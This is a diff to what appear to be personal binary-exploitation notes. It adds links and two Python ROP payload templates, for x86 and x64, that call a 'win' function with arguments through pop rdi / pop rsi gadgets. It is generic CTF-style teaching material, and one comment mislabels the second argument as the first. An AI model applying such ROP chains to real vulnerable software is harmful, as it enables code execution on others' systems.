@@ -13,18 +13,34 @@
 - https://github.com/inaz2/roputils
 
 
-## Function ROP: calling conventions x86
+## Function ROP: calling conventions 
 
 - https://beta.hackndo.com/conventions-d-appel/
 - https://dp12.github.io/posts/calling-conventions-for-pwn-and-profit/
+- https://github.com/ir0nstone/cybersec-notes/blob/master/binexp/stack/return-oriented-programming/exploiting-calling-conventions.md
 
-```bash
+```python
+# x86
 payload = b"\x90" * offset
 payload += p32(win)
-# fake return address for win
+## we already are on the stack
+## fake return address for win
 payload += p32(0x12345678)
-payload += p32(arg2)
+## push is on reversed order
 payload += p32(arg1)
+payload += p32(arg2)
+```
+
+```python
+# x64
+payload = b"\x90" * offset
+payload += p64(POP_RDI)        # pop rdi; ret
+payload += p64(arg1)     # value into rdi -> first param
+payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
+payload += p64(arg2)     # value into rsi -> first param
+payload += p64(0x0)            # value into r15 -> not important
+payload += p64(win)
+payload += p64(0x0)
 ```
 
 ## Alignement & x64 MOVABS Issue
